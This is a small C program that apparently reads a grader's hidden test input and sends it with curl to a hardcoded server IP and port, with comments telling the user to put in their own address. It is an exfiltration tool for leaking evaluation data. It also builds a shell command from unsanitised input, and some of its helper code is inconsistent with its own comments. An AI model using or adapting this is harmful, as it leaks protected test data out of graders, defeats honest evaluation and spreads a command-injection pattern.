#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#define LENGTH 1000
int exec_cmd(const char *cmd);
// CMD(Terminal) control: input terminal command
void change_space();
//Change " " to "_" to avoid some problems
char output[LENGTH]="";



char head[LENGTH]="curl http://10.198.67.44:8080/Receiver?message=Input --data-binary ";
/*!!! Replace the IP and port to your IP and port !!!*/
void GetInput(char* output){
    #define SET_LENGTH 100
    int A[SET_LENGTH]={0};
    int B[SET_LENGTH]={0};
    int a,b;
    scanf("%d %d",&a,&b);
    for (int i=0; i<a; i++) scanf("%d",&A[i]); 
    for (int i=0; i<b; i++) scanf("%d",&B[i]);
    char temp[LENGTH] = "";
    sprintf(temp,"%d_%d_____",a,b);
    strcat(output, temp);
    sprintf(temp,"%d %d",a,b);
    for(int i=0; i<a; i++){
        sprintf(temp,"%d_", A[i]);
        strcat(output, temp);
    } strcat(output, "___");
    for(int i=0; i<b; i++){
        sprintf(temp,"%d_", B[i]);
        strcat(output, temp);
    } strcat(output, "___");
}/*!!! Replace this function to your own code to get the input !!!*/
/*!!! Input: char* to save the result !!!*/



int main(){
    char output[LENGTH] = "";
    GetInput(output);
    change_space();
    strcat(head,output);
    exec_cmd(head);
    // printf("%s\n",output);
    printf("%s\n",head);
    return 0;
}/*!!! Don't change main function if not neccessary !!!*/


// Two useful function below
int exec_cmd(const char *cmd){
    FILE *pipe = popen(cmd, "r");
    if(!pipe) return -1;
    char buffer[LENGTH] = {0};
    while(!feof(pipe)){
        if(fgets(buffer, LENGTH, pipe))
            strcat(output, buffer);	}
    pclose(pipe);
    return 1;
} // CMD(Terminal) control
void change_space(){
    char *p;
    int i=0, num=0;
    for(p=output;*p!='\0';p++)
        if(*p==' '||*p=='\n') *p='!';
    //printf("%s\n",output);
} //Change " " to "_" to avoid some problems

